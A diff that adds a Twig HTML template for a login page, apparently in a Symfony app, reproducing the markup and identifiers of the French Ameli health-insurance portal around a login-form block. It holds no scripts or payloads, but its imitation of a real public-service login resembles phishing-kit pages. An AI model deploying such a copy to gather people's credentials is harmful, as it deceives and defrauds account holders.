@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE" />
+        {% block head %}
+            {%- include '@App/Templates/head.html.twig' -%}
+        {% endblock %}
+    </head>
+    <body>
+    {%- include '@App/Templates/entete.html.twig' -%}
+        <div id="ameli_portal_book_2" class="wlp-bighorn-book">
+    <nav class="wlp-bighorn-menu-multi" role="navigation"></nav>
+       <div class="news" ></div> 
+    <div class="wlp-bighorn-book-content">
+        <div id="as_connexion_book" class="wlp-bighorn-book"><div class="wlp-bighorn-book-content">
+            <main id="as_login_page" class="wlp-bighorn-page-unconnect" role="main">
+                <section id="contenu" class="corps-de-page">
+                    <div class="wlp-bighorn-layout wlp-bighorn-layout-grid"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-grid-cell">
+                        <div></div>
+                        <div class="wlp-bighorn-layout wlp-bighorn-layout-flow"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-vertical wlp-bighorn-layout-flow-first" style="height: auto">
+                        <div></div>
+                        <div id="connexioncompte_2" class="wlp-bighorn-window  ">
+                            <div class="wlp-bighorn-window-content">
+                                <div class="r_cnx_page" id="loginPage">
+                                    <div>
+                                        {% block body %}
+                                            {% block fos_user_content %}
+                                            {% endblock fos_user_content %}
+                                        {% endblock %}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+</div></div>
+
+</div>
+
+{%- include '@App/Templates/footer.html.twig' -%}
+    </body>
+</html>
+
